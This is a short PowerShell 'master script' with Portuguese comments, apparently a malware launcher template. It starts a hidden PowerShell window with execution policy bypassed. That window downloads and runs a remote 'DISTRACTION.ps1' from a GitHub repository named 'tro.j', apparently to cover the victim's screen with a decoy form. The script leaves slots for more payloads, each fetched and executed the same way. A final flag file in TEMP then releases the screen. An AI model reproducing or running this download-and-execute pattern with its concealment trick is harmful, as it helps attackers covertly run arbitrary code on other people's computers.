# ==============================================
# SCRIPT MESTRE - EXECUTADO NO POWERSHELL ADMIN
# ==============================================

# 1. Inicia a distração em um processo separado (para ter acesso à interface gráfica)
#    Baixa o script DISTRACTION.ps1 e executa em uma nova janela do PowerShell (oculta)
$distractScript = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/DISTRACTION.ps1"
$distractCommand = "iex ((New-Object Net.WebClient).DownloadString('$distractScript'))"
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -WindowStyle Hidden -Exec Bypass -Command `"$distractCommand`"" -WindowStyle Hidden

# Dá um tempo para a distração abrir o formulário (2 segundos)
Start-Sleep -Seconds 2

# 2. AQUI VOCÊ ADICIONA SEUS PAYLOADS (UM POR UM)
# Exemplo:
# iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/seu/payload1.ps1'))
# iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/seu/payload2.ps1'))

Write-Host "Aguardando 10 segundos (payloads vazios)"
Start-Sleep -Seconds 10

# 3. Após todos os payloads, cria a flag para destravar a tela
New-Item -Path "$env:TEMP\ov.stop" -ItemType File -Force | Out-Null
Write-Host "Flag criada. Distração será encerrada."